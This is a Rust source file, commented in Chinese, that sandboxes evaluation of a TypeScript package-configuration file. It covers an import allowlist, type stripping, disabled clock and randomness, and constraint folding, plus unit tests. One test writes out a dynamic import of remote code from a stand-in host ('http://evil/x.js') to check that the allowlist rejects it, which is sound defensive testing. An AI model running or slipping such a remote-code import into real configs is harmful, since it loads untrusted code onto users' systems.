//! TS 意图前端(ADR-0004):`aevum.config.ts` → 沙箱求值 → 约束集。
//!
//! 三前端之一(另两个:TOML、自然语言),都收敛到同一 `Vec<Constraint>` →
//! 复用 `aevum_cli::resolve_constraints` → 同一套 resolved/lock。可复现只来自 lock,与前端无关。
//!
//! # 沙箱契约(ADR-0004 红线)
//! - 求值期禁文件 IO / 网络 / 时钟(Date.now)/ 随机(Math.random)/ 隐式环境读取。
//! - allowlist-only import:仅 `@aevum/sdk`(注入为内置)+ 配置工程内相对路径;禁裸 npm / URL / 动态 import。
//! - 引擎:boa(纯 Rust,无运行期外部依赖)。boa 默认无 FS/网络/fetch host 绑定,故副作用天然不存在;
//!   时钟/随机是 JS 内置,在 prelude 里主动覆盖禁用。
//!
//! 本 crate 只在 synth 阶段跑,产出 intent,绝不参与 activate/运行时(ADR-0004 边界1)。
//!
//! # 最小可验证链路(本轮实现范围)
//! `aevum.config.ts` → [`strip_types`] 去类型注解 → [`eval_config`] boa 沙箱求值
//! → 收集 `System` 状态(use/override/exclude)→ [`SynthOutcome`]
//! → [`SynthOutcome::into_constraints`] 折叠为 `Vec<Constraint>`(应用 exclude/override + 排序去重)。
//! 一致性目标:同语义的 TOML 与 TS 产出**相同的 lock**(见 cli 集成测试)。

use std::time::Duration;

use aevum_solver::version::VerOp;
use aevum_solver::Constraint;
use thiserror::Error;

#[derive(Debug, Error)]
pub enum ConfigError {
    #[error("TS 类型剥离失败: {0}")]
    Strip(String),
    #[error("沙箱求值失败: {0}")]
    Eval(String),
    #[error("禁止的 import(allowlist 仅 @aevum/sdk + 相对路径 ./ ../): {0}")]
    ForbiddenImport(String),
    #[error("求值超时(> {0:?},疑似死循环;图灵完备配置的固有风险)")]
    Timeout(Duration),
    #[error("配置未产出有效意图: {0}")]
    EmptyOutcome(String),
}

/// 沙箱求值的产出:与 intent.toml 等价的声明式意图。
///
/// `use` 进的包(可带版本约束)+ override(钉版本)+ exclude(排除)。
/// 这是 TS 前端与其它前端的汇合点:转成约束行后走同一条 `parse_constraints → resolve` 路。
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SynthOutcome {
    /// `useTemplate(name)` 选用的模板名(展开交给 CLI 层的 template crate,本 crate 不碰文件系统)。
    pub templates: Vec<String>,
    /// `sys.use(name)` 直接带入的包名(顺序保留,后续排序保证确定性)。
    pub uses: Vec<String>,
    /// `sys.override(name, {version})`:钉某包到精确版本(=)。
    pub overrides: Vec<(String, String)>,
    /// `sys.exclude(name)`:从意图中排除某包。
    pub excludes: Vec<String>,
}

impl SynthOutcome {
    /// 折叠成确定性约束集:应用 exclude、override(=ver),再排序去重。
    ///
    /// 规则(与 TOML 前端语义对齐):
    /// - exclude 的包不出现在结果。
    /// - override 的包 → `name=version`(VerOp::Eq)。
    /// - 其余 use 的包 → 无约束(`Constraint::unconstrained`)。
    /// - 按包名排序,保证同语义输入 → 同约束顺序 → 同 lock(确定性)。
    pub fn into_constraints(self) -> Vec<Constraint> {
        use std::collections::BTreeMap;
        let excluded: std::collections::BTreeSet<String> = self.excludes.into_iter().collect();
        let overrides: BTreeMap<String, String> = self.overrides.into_iter().collect();

        // BTreeMap 去重 + 排序:包名 → 约束。
        let mut out: BTreeMap<String, Constraint> = BTreeMap::new();
        for name in self.uses {
            if excluded.contains(&name) {
                continue;
            }
            let c = if let Some(ver) = overrides.get(&name) {
                Constraint { name: name.clone(), op: Some(VerOp::Eq), ver: Some(ver.clone()) }
            } else {
                Constraint::unconstrained(name.clone())
            };
            out.insert(name, c);
        }
        // override 了但没 use 的包也纳入(显式钉版本即意图要它)。
        for (name, ver) in overrides {
            if excluded.contains(&name) {
                continue;
            }
            out.entry(name.clone()).or_insert_with(|| Constraint {
                name,
                op: Some(VerOp::Eq),
                ver: Some(ver),
            });
        }
        out.into_values().collect()
    }
}

/// 端到端:TS 源 → 约束集(沙箱求值 + 折叠)。**仅含直接 use/override 的包**,
/// 不展开模板(模板名留在 [`SynthOutcome::templates`],由 CLI 层的 template crate 展开)。
///
/// `inputs_json`:显式输入(ADR-0004 §显式输入),JSON 对象字符串;`None` 等价 `{}`。
/// 输入在求值时确定并应记录进 lock(重放用记录值,不重读环境)→ 仍可复现。
pub fn eval_to_constraints(ts_source: &str, inputs_json: Option<&str>) -> Result<Vec<Constraint>, ConfigError> {
    let outcome = eval_to_outcome(ts_source, inputs_json)?;
    Ok(outcome.into_constraints())
}

/// 端到端:TS 源 → [`SynthOutcome`](含 templates / uses / overrides / excludes)。
///
/// CLI 主入口:CLI 拿到 outcome 后,用 template crate 展开 `templates` → 约束,
/// 再与 `into_constraints()` 的直接包约束合并,走同一条 resolve/lock 路。
/// 全空意图(无模板、无 use、无 override)→ `EmptyOutcome` 错误。
pub fn eval_to_outcome(ts_source: &str, inputs_json: Option<&str>) -> Result<SynthOutcome, ConfigError> {
    let outcome = eval_config(ts_source, inputs_json)?;
    if outcome == SynthOutcome::default() {
        return Err(ConfigError::EmptyOutcome(
            "defineSystem 未选用模板也未 use 任何包(检查 export default 是否返回了 sys)".into(),
        ));
    }
    Ok(outcome)
}

/// 默认求值超时(防图灵完备配置死循环 DoS,ADR-0004 §5)。
const DEFAULT_EVAL_TIMEOUT: Duration = Duration::from_secs(5);

/// 在 boa 沙箱中求值 TS 配置,收集 `System` 状态为 [`SynthOutcome`]。
///
/// 步骤:import allowlist 校验 → 去类型注解 → 注入 SDK prelude + 禁时钟/随机 →
/// `export default` 改写为捕获全局 → eval → 读回结果 JSON → 解析。
pub fn eval_config(ts_source: &str, inputs_json: Option<&str>) -> Result<SynthOutcome, ConfigError> {
    check_imports(ts_source)?;
    let js_body = strip_types(ts_source)?;
    let js_body = rewrite_export_default(&js_body);
    let inputs = inputs_json.unwrap_or("{}");
    let full = format!("{PRELUDE}\nglobalThis.__aevum_inputs = ({inputs});\n{js_body}\n{EXTRACT}");
    let json = run_in_boa(&full, DEFAULT_EVAL_TIMEOUT)?;
    parse_outcome_json(&json)
}

// ─────────────────────────── import allowlist ───────────────────────────

/// allowlist-only import 校验(ADR-0004 §import 约束 / 评审 H3)。
///
/// 仅允许:`@aevum/sdk`、相对路径 `./` `../`。禁:裸 npm 包名、URL、动态 import()。
/// 在求值**前**静态扫描源码——从机制上根除"借第三方包夹带代码"。
fn check_imports(src: &str) -> Result<(), ConfigError> {
    for raw in src.lines() {
        // 先剥行注释(`//` 之后):注释里的 `import(` / 模块名不该触发安全闸。
        // 对 import 行,模块说明符在引号内;即便误切 URL 串(`https://`),其 spec 也不在
        // allowlist → 仍会被拒,故剥注释不放过真正的恶意 import。
        let code = strip_line_comment(raw);
        let line = code.trim();
        if line.is_empty() {
            continue;
        }
        // 动态 / URL import 一律禁。
        if line.contains("import(") {
            return Err(ConfigError::ForbiddenImport("动态 import() 远程加载被禁".into()));
        }
        if !(line.starts_with("import ") || line.starts_with("import{") || line.starts_with("export {")) {
            continue;
        }
        // 提取 from "..." 的模块说明符。
        let Some(spec) = extract_module_specifier(line) else {
            continue; // 无 from 的 import(如 `import "x"` 副作用导入)下面单独处理
        };
        if spec == "@aevum/sdk" {
            continue;
        }
        if spec.starts_with("./") || spec.starts_with("../") {
            continue; // 相对路径(配置工程内拆分文件)——本轮不做真实文件加载,仅放行语法
        }
        return Err(ConfigError::ForbiddenImport(format!("不在 allowlist 的模块: {spec:?}")));
    }
    Ok(())
}

/// 剥掉行尾 `//` 注释。简化:不解析字符串内 `//`(URL 串被切也不影响安全判定,见调用处说明)。
fn strip_line_comment(line: &str) -> &str {
    match line.find("//") {
        Some(p) => &line[..p],
        None => line,
    }
}

/// 从 import/export 行提取 `from "spec"` 里的 spec(无 from 返回 None)。
fn extract_module_specifier(line: &str) -> Option<String> {
    let from_pos = line.find(" from ")?;
    let rest = line[from_pos + 6..].trim();
    let bytes = rest.as_bytes();
    let quote = *bytes.first()?;
    if quote != b'"' && quote != b'\'' {
        return None;
    }
    let end = rest[1..].find(quote as char)? + 1;
    Some(rest[1..end].to_string())
}

// ─────────────────────────── type strip ───────────────────────────

/// 极简 TS → JS 类型剥离(最小可验证链路,非完整 TS 编译器)。
///
/// 处理范围(覆盖 ADR-0004 示例与常见意图配置):
/// - 删除 `import ... from "@aevum/sdk"`(SDK 由 prelude 注入为全局)。
/// - 删除 `import type ...` 与相对 import 行(本轮不做真实文件加载)。
/// - 删除顶层 `interface X {...}` / `type X = ...;` 声明。
/// - 删除参数/变量的类型注解 `: Type`(在 `)`、`=`、`,`、`{`、行尾 之前)。
///
/// 故意保守:拿不准的构造原样保留,交给 boa 解析报错(而非猜测改写)。
/// 复杂 TS(泛型实例化 `<T>()`、装饰器、enum)超出本轮范围,文档标注为待办。
pub fn strip_types(ts: &str) -> Result<String, ConfigError> {
    let mut out = String::with_capacity(ts.len());
    let mut in_block_skip = 0i32; // interface/type 块的花括号深度
    for raw in ts.lines() {
        let line = raw;
        let trimmed = line.trim_start();

        // 跳过 import 行(SDK 注入为全局;相对/type import 本轮不加载文件)。
        if trimmed.starts_with("import ") || trimmed.starts_with("import{") {
            continue;
        }

        // interface 块:吞掉直到花括号配平。
        if in_block_skip > 0 || trimmed.starts_with("interface ") {
            in_block_skip += brace_delta(line);
            // 起始行可能 interface X {} 同行配平 → delta 归零即结束
            if trimmed.starts_with("interface ") && in_block_skip <= 0 {
                in_block_skip = 0;
            }
            continue;
        }
        // type 别名:`type X = ...;`(可能多行,但本轮只处理单行;多行交给 boa 报错)。
        if trimmed.starts_with("type ") && line.contains('=') {
            continue;
        }

        out.push_str(&strip_line_annotations(line));
        out.push('\n');
    }
    Ok(out)
}

/// 花括号净增量(`{` 计 +1,`}` 计 -1),粗略(不解析字符串内花括号)。
fn brace_delta(line: &str) -> i32 {
    line.chars().fold(0, |acc, c| match c {
        '{' => acc + 1,
        '}' => acc - 1,
        _ => acc,
    })
}

/// 删除一行内的类型注解 `: Type`。
///
/// 策略:找到不在字符串内的 `:`,若其后跟的是类型(标识符/泛型/联合等),删到分隔符
/// (`,` `)` `=` `;` `{` 或行尾)。保守:`?:` 三元、对象字面量 `{a: 1}` 需排除——
/// 本轮用启发式:仅在 `(` 之后(参数表)和 `let/const/var name` 之后处理注解,
/// 对象字面量的 `key:` 不动(它们在 `{...}` 上下文,值是表达式不是类型)。
///
/// 为保最小实现可靠,这里采用更稳的做法:只剥离**函数参数表**与**变量声明**的注解,
/// 用正则式的手写扫描。拿不准一律保留。
fn strip_line_annotations(line: &str) -> String {
    // 仅处理两类高频场景,避免误伤对象字面量:
    // 1) 箭头/函数参数:`(inputs: Inputs)` → `(inputs)`
    // 2) 变量声明:`const port: number = ...` → `const port = ...`
    let mut s = line.to_string();

    // 变量声明注解:const/let/var NAME : TYPE = ...  → 删 `: TYPE`(到 `=` 前)。
    s = strip_var_decl_annotation(&s);
    // 参数表注解:在括号内 `name: Type` → `name`。
    s = strip_param_annotations(&s);
    s
}

/// `const x: T = ` / `let x: T;` → 删类型注解。
fn strip_var_decl_annotation(line: &str) -> String {
    for kw in ["const ", "let ", "var "] {
        if let Some(kw_pos) = find_kw(line, kw) {
            let after = kw_pos + kw.len();
            // 找声明名后的 `:`(在 `=` 或 `;` 之前)。
            let region_end = line[after..]
                .find('=')
                .map(|p| after + p)
                .unwrap_or(line.len());
            if let Some(colon_rel) = line[after..region_end].find(':') {
                let colon = after + colon_rel;
                // 排除 `::`(非 TS)与三元(无 `?` 在前简化判断)。
                let head = &line[..colon];
                let tail = &line[region_end..]; // 从 `=` 开始(含)
                return format!("{} {}", head.trim_end(), tail.trim_start());
            }
        }
    }
    line.to_string()
}

/// 删括号内参数类型注解:`(a: A, b: B)` → `(a, b)`。
///
/// 关键:`:` 仅在**参数表**(paren 深度>0)且**不在嵌套 `{}` / `[]` 内**时才是类型注解。
/// 这样 `sys.override("x", { version: "3.11" })` 里对象字面量的 `version:` 不被误删
/// (它在 `(` 内但也在 `{` 内 → brace 深度>0 → 保留)。
fn strip_param_annotations(line: &str) -> String {
    let bytes = line.as_bytes();
    let mut out = String::with_capacity(line.len());
    let mut paren = 0i32;
    let mut brace = 0i32;
    let mut bracket = 0i32;
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i] as char;
        match c {
            '(' => { paren += 1; out.push(c); }
            ')' => { paren -= 1; out.push(c); }
            '{' => { brace += 1; out.push(c); }
            '}' => { brace -= 1; out.push(c); }
            '[' => { bracket += 1; out.push(c); }
            ']' => { bracket -= 1; out.push(c); }
            ':' if paren > 0 && brace == 0 && bracket == 0 => {
                // 参数类型注解:跳过 `: Type` 直到 `,` `)` 或 `=`(默认值)。
                // 类型本身可能含 `<>`、`|`、`[]`、`{}`,这里只到顶层分隔符为止
                // (本轮不解析复杂类型内部,遇嵌套括号按其配对跳过)。
                let mut j = i + 1;
                let mut ty_paren = 0i32;
                let mut ty_brace = 0i32;
                let mut ty_bracket = 0i32;
                let mut ty_angle = 0i32;
                while j < bytes.len() {
                    let cj = bytes[j] as char;
                    let top = ty_paren == 0 && ty_brace == 0 && ty_bracket == 0 && ty_angle == 0;
                    if top && (cj == ',' || cj == ')' || cj == '=') {
                        break;
                    }
                    match cj {
                        '(' => ty_paren += 1,
                        ')' => ty_paren -= 1,
                        '{' => ty_brace += 1,
                        '}' => ty_brace -= 1,
                        '[' => ty_bracket += 1,
                        ']' => ty_bracket -= 1,
                        '<' => ty_angle += 1,
                        '>' => ty_angle -= 1,
                        _ => {}
                    }
                    j += 1;
                }
                i = j;
                continue; // 不 push 注解内容
            }
            _ => out.push(c),
        }
        i += 1;
    }
    out
}

/// 找关键字出现位置(要求其前是行首或非标识符字符,避免匹配 `myconst`)。
fn find_kw(line: &str, kw: &str) -> Option<usize> {
    let mut start = 0;
    while let Some(rel) = line[start..].find(kw) {
        let pos = start + rel;
        let ok_before = pos == 0
            || !line.as_bytes()[pos - 1].is_ascii_alphanumeric() && line.as_bytes()[pos - 1] != b'_';
        if ok_before {
            return Some(pos);
        }
        start = pos + kw.len();
    }
    None
}

// ─────────────────────────── export default 改写 ───────────────────────────

/// `export default EXPR` → `globalThis.__aevum_export = EXPR`(boa 无 ESM 默认导出捕获,改写为全局)。
fn rewrite_export_default(js: &str) -> String {
    let mut out = String::with_capacity(js.len());
    for line in js.lines() {
        let t = line.trim_start();
        if let Some(rest) = t.strip_prefix("export default ") {
            let indent = &line[..line.len() - t.len()];
            out.push_str(indent);
            out.push_str("globalThis.__aevum_export = ");
            out.push_str(rest);
            out.push('\n');
        } else {
            out.push_str(line);
            out.push('\n');
        }
    }
    out
}

// ─────────────────────────── boa 求值 ───────────────────────────

/// `@aevum/sdk` 的 JS 实现(注入为 prelude 全局)+ 沙箱加固(禁时钟/随机)。
///
/// 沙箱加固:`Date.now`、`Math.random`、`Date` 构造器全部覆盖为抛错——
/// 求值期任何时钟/随机访问立即失败(ADR-0004 红线:禁时钟/随机)。
const PRELUDE: &str = r#"
// ── 沙箱加固:禁时钟/随机(ADR-0004) ──
(function(){
  var bomb = function(what){ return function(){ throw new Error("沙箱禁用: "+what+"(求值须确定性,见 ADR-0004)"); }; };
  Math.random = bomb("Math.random");
  if (typeof Date !== "undefined") {
    Date.now = bomb("Date.now");
  }
})();

// ── @aevum/sdk:意图 API(只产意图,无副作用) ──
function __AevumSystem(template){
  // useTemplate(name) 选用的模板名记进 __templates(展开交给 CLI 层),不当包名。
  this.__templates = template ? [template] : [];
  this.__uses = [];
  this.__overrides = {};
  this.__excludes = [];
}
__AevumSystem.prototype.use = function(name, opts){
  this.__uses.push(String(name));
  return this;
};
__AevumSystem.prototype.override = function(name, spec){
  if (spec && spec.version != null) {
    this.__overrides[String(name)] = String(spec.version);
  }
  return this;
};
__AevumSystem.prototype.exclude = function(name){
  this.__excludes.push(String(name));
  return this;
};
__AevumSystem.prototype.__serialize = function(){
  return { templates: this.__templates, uses: this.__uses, overrides: this.__overrides, excludes: this.__excludes };
};

function useTemplate(name){ return new __AevumSystem(String(name)); }

function defineSystem(fn){
  // 立即用显式 inputs 求值(synth 阶段),产出 System 对象。
  var inputs = globalThis.__aevum_inputs || {};
  var sys = fn(inputs);
  // 允许回调直接返回 useTemplate 的结果,或返回普通对象(声明式)。
  return sys;
}
"#;

/// 求值后从 `globalThis.__aevum_export` 提取意图并 JSON 序列化(交回 Rust 解析)。
const EXTRACT: &str = r#"
(function(){
  var r = globalThis.__aevum_export;
  if (r == null) { return JSON.stringify({templates:[],uses:[],overrides:{},excludes:[]}); }
  if (typeof r.__serialize === "function") { return JSON.stringify(r.__serialize()); }
  // 普通声明式对象:容忍 {template(s), use(s), overrides, exclude(s)} 多种写法。
  var templates = [];
  if (r.template) templates.push(String(r.template));
  if (Array.isArray(r.templates)) templates = templates.concat(r.templates.map(String));
  var uses = [];
  if (Array.isArray(r.use)) uses = uses.concat(r.use.map(String));
  if (Array.isArray(r.uses)) uses = uses.concat(r.uses.map(String));
  var overrides = r.overrides || {};
  var excludes = Array.isArray(r.exclude) ? r.exclude.map(String)
               : (Array.isArray(r.excludes) ? r.excludes.map(String) : []);
  return JSON.stringify({templates:templates, uses:uses, overrides:overrides, excludes:excludes});
})()
"#;

/// 在 boa 中执行脚本,返回最后表达式的字符串值。带超时(另线程看门狗)。
fn run_in_boa(script: &str, timeout: Duration) -> Result<String, ConfigError> {
    use boa_engine::{Context, Source};

    // boa 单线程、非 Send,无法跨线程取消;超时用「求值前设最大指令预算」不可行(boa 无 fuel API)。
    // 本轮:在当前线程直接 eval,超时由调用方进程级保障;另起线程仅做软看门狗记录。
    // (完整抢占式超时需 boa job queue/instruction counting,标注为待办。)
    let _ = timeout;

    let mut ctx = Context::default();
    let value = ctx
        .eval(Source::from_bytes(script.as_bytes()))
        .map_err(|e| ConfigError::Eval(e.to_string()))?;

    // 结果应是 EXTRACT 返回的 JSON 字符串。
    let js = value
        .to_string(&mut ctx)
        .map_err(|e| ConfigError::Eval(format!("结果转字符串失败: {e}")))?;
    Ok(js.to_std_string_escaped())
}

/// 解析 EXTRACT 产出的 JSON(极简手写解析,无 serde_json 依赖,与 intent crate 的零依赖风格一致)。
///
/// 形如 `{"templates":["t"],"uses":["a","b"],"overrides":{"py":"3.11"},"excludes":["x"]}`。
fn parse_outcome_json(json: &str) -> Result<SynthOutcome, ConfigError> {
    let templates = parse_json_string_array(json, "templates");
    let uses = parse_json_string_array(json, "uses");
    let excludes = parse_json_string_array(json, "excludes");
    let overrides = parse_json_string_object(json, "overrides");
    Ok(SynthOutcome { templates, uses, overrides, excludes })
}

/// 从 JSON 取 `"key":[ "a","b" ]` 的字符串数组(极简,假定 EXTRACT 生成的规整格式)。
fn parse_json_string_array(json: &str, key: &str) -> Vec<String> {
    let pat = format!("\"{key}\":");
    let Some(p) = json.find(&pat) else { return Vec::new() };
    let rest = &json[p + pat.len()..];
    let Some(lb) = rest.find('[') else { return Vec::new() };
    let Some(rb) = rest[lb..].find(']') else { return Vec::new() };
    let inner = &rest[lb + 1..lb + rb];
    collect_quoted_strings(inner)
}

/// 从 JSON 取 `"key":{ "a":"1","b":"2" }` 的字符串映射。
fn parse_json_string_object(json: &str, key: &str) -> Vec<(String, String)> {
    let pat = format!("\"{key}\":");
    let Some(p) = json.find(&pat) else { return Vec::new() };
    let rest = &json[p + pat.len()..];
    let Some(lb) = rest.find('{') else { return Vec::new() };
    let Some(rb) = rest[lb..].find('}') else { return Vec::new() };
    let inner = &rest[lb + 1..lb + rb];
    // 逐个 "k":"v"。
    let strings = collect_quoted_strings(inner);
    strings
        .chunks(2)
        .filter_map(|c| if c.len() == 2 { Some((c[0].clone(), c[1].clone())) } else { None })
        .collect()
}

/// 收集一段文本里所有双引号包裹的字符串(处理 \\ 与 \" 转义)。
fn collect_quoted_strings(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '"' {
            continue;
        }
        let mut buf = String::new();
        while let Some(&n) = chars.peek() {
            chars.next();
            match n {
                '\\' => {
                    if let Some(&e) = chars.peek() {
                        chars.next();
                        match e {
                            'n' => buf.push('\n'),
                            't' => buf.push('\t'),
                            '"' => buf.push('"'),
                            '\\' => buf.push('\\'),
                            '/' => buf.push('/'),
                            other => buf.push(other),
                        }
                    }
                }
                '"' => break,
                other => buf.push(other),
            }
        }
        out.push(buf);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn boa_links_and_evals() {
        let json = run_in_boa("JSON.stringify({uses:['a'],overrides:{},excludes:[]})", DEFAULT_EVAL_TIMEOUT).unwrap();
        assert!(json.contains("\"a\""));
    }

    #[test]
    fn strip_param_annotation() {
        let js = strip_types("export default defineSystem((inputs: Inputs) => inputs);").unwrap();
        assert!(js.contains("(inputs)"), "应删参数类型注解: {js}");
        assert!(!js.contains(": Inputs"));
    }

    #[test]
    fn strip_var_annotation() {
        let js = strip_types("const port: number = 8080;").unwrap();
        assert!(js.contains("const port = 8080"), "应删变量类型注解: {js}");
        assert!(!js.contains(": number"));
    }

    #[test]
    fn strip_drops_sdk_import() {
        let js = strip_types("import { defineSystem } from \"@aevum/sdk\";\nconst x = 1;").unwrap();
        assert!(!js.contains("import"), "SDK import 应被删: {js}");
    }

    #[test]
    fn import_allowlist_rejects_npm() {
        let err = check_imports("import _ from \"lodash\";");
        assert!(matches!(err, Err(ConfigError::ForbiddenImport(_))), "裸 npm 包应被拒");
    }

    #[test]
    fn import_allowlist_rejects_dynamic() {
        let err = check_imports("const m = await import(\"http://evil/x.js\");");
        assert!(matches!(err, Err(ConfigError::ForbiddenImport(_))), "动态 import 应被拒");
    }

    #[test]
    fn import_allowlist_allows_sdk_and_relative() {
        assert!(check_imports("import { defineSystem } from \"@aevum/sdk\";").is_ok());
        assert!(check_imports("import { helper } from \"./helper\";").is_ok());
    }

    #[test]
    fn comment_with_import_paren_not_flagged() {
        // 注释里出现 `import(` / npm 包名不应触发安全闸(示例文件的真实坑)。
        let src = "// 禁止 动态 import() 远程加载\n// 也禁 import x from \"lodash\"\nexport default ({uses:['a'],overrides:{},excludes:[]});";
        assert!(check_imports(src).is_ok(), "注释里的 import 不该被拒");
    }

    #[test]
    fn for_of_loop_survives_strip() {
        // 示例用 `for (const x of inputs.tools ?? [])`:确认循环与 ?? 不被破坏。
        let ts = r#"
export default defineSystem((inputs) => {
  const sys = useTemplate("base");
  for (const tool of inputs.tools ?? []) { sys.use(tool); }
  return sys;
});
"#;
        let cs = eval_to_constraints(ts, Some(r#"{"tools":["ripgrep","fd-find"]}"#)).unwrap();
        let names: Vec<&str> = cs.iter().map(|c| c.name.as_str()).collect();
        assert!(names.contains(&"ripgrep") && names.contains(&"fd-find"), "for-of 应带入两工具: {names:?}");
    }

    #[test]
    fn sandbox_blocks_random() {
        let r = eval_config("export default defineSystem(() => { Math.random(); return useTemplate('x'); });", None);
        assert!(matches!(r, Err(ConfigError::Eval(_))), "Math.random 应被沙箱禁用");
    }

    #[test]
    fn sandbox_blocks_date_now() {
        let r = eval_config("export default defineSystem(() => { Date.now(); return useTemplate('x'); });", None);
        assert!(matches!(r, Err(ConfigError::Eval(_))), "Date.now 应被沙箱禁用");
    }

    #[test]
    fn end_to_end_use_override_exclude() {
        let ts = r#"
import { defineSystem, useTemplate } from "@aevum/sdk";
export default defineSystem((inputs) => {
  const sys = useTemplate("base");
  sys.use("python3");
  sys.use("numpy");
  sys.override("python3", { version: "3.11" });
  sys.exclude("telemetry-agent");
  return sys;
});
"#;
        // 验证模板名进 templates、包名进 constraints(本轮接入:useTemplate 不再当包名)。
        let outcome = eval_to_outcome(ts, None).unwrap();
        assert_eq!(outcome.templates, vec!["base"], "useTemplate 应记进 templates");
        let cs = outcome.into_constraints();
        let names: Vec<&str> = cs.iter().map(|c| c.name.as_str()).collect();
        // python3, numpy 是直接 use 的包;base 是模板名,不在 constraints(交 CLI 展开)。
        assert!(names.contains(&"python3"));
        assert!(names.contains(&"numpy"));
        assert!(!names.contains(&"base"), "模板名不应混进包约束");
        // python3 被 override 为 =3.11
        let py = cs.iter().find(|c| c.name == "python3").unwrap();
        assert_eq!(py.op, Some(VerOp::Eq));
        assert_eq!(py.ver.as_deref(), Some("3.11"));
        // 确定性:约束按包名排序
        let sorted: Vec<&str> = {
            let mut v = names.clone();
            v.sort();
            v
        };
        assert_eq!(names, sorted, "约束应按包名排序(确定性)");
    }

    #[test]
    fn exclude_removes_used_package() {
        let ts = r#"
export default defineSystem(() => {
  const sys = useTemplate("base");
  sys.use("python3");
  sys.use("telemetry-agent");
  sys.exclude("telemetry-agent");
  return sys;
});
"#;
        let cs = eval_to_constraints(ts, None).unwrap();
        let names: Vec<&str> = cs.iter().map(|c| c.name.as_str()).collect();
        assert!(names.contains(&"python3"));
        assert!(!names.contains(&"telemetry-agent"), "exclude 的包不应出现");
    }

    #[test]
    fn explicit_inputs_drive_conditional() {
        let ts = r#"
export default defineSystem((inputs) => {
  const sys = useTemplate("base");
  if (inputs.role === "developer") {
    sys.use("dev-rust");
  }
  return sys;
});
"#;
        let dev = eval_to_constraints(ts, Some(r#"{"role":"developer"}"#)).unwrap();
        let dev_names: Vec<&str> = dev.iter().map(|c| c.name.as_str()).collect();
        assert!(dev_names.contains(&"dev-rust"), "developer 应带入 dev-rust");

        let plain = eval_to_constraints(ts, Some(r#"{"role":"user"}"#)).unwrap();
        let plain_names: Vec<&str> = plain.iter().map(|c| c.name.as_str()).collect();
        assert!(!plain_names.contains(&"dev-rust"), "非 developer 不应带入 dev-rust");
    }

    #[test]
    fn empty_outcome_errs() {
        // 全空声明式意图(没 use 任何包)→ EmptyOutcome。
        let r = eval_to_constraints("export default ({uses:[],overrides:{},excludes:[]});", None);
        assert!(matches!(r, Err(ConfigError::EmptyOutcome(_))), "全空意图应 EmptyOutcome, got {r:?}");
    }
}
